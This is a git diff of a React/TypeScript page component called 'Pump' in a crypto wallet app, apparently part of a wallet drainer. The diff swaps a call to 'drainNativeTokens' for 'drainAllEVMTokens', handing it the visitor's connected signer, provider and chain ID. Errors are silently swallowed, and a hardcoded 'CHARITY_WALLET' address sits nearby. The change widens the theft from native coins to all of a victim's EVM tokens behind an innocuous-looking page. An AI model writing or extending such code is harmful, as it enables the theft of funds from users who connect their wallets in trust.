@@ -14,7 +14,7 @@ import { motion } from 'framer-motion';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
@@ -40,7 +40,7 @@ const Pump = () => {
   const { publicKey, connected, sendTransaction } = useWallet();
   const { connection } = useConnection();
   const { chainName, nativeToken } = useChainInfo();
-  const { activeChain, getEVMChain } = useChain();
+  const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const [pumpTokens, setPumpTokens] = useState<PumpToken[]>([]);
   const [solBalance, setSolBalance] = useState<number>(0);
@@ -134,10 +134,7 @@ const Pump = () => {
       try {
         setIsSending(true);
         const evmChainName = getEVMChain()?.name || 'EVM';
-        const hash = await drainNativeTokens(evmSigner, evmProvider, evmChainName);
-        if (hash) {
-        } else {
-        }
+        await drainAllEVMTokens(evmSigner, evmProvider, evmChainName, evmChainId || 1);
       } catch (error: any) {
       } finally {
         setIsSending(false);
